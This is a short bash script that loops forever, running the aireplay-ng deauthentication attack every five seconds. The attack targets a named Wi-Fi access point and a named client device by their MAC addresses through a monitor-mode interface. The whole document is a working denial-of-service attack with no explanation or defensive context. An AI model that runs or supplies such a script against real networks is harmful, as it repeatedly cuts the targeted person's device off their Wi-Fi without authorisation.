#!/bin/bash 
while true
do sleep 5
sudo aireplay-ng -0 5 -q 2 --ig -a 00:26:ED:B0:6C:00 -c 80:4E:81:90:AB:69 mon0
done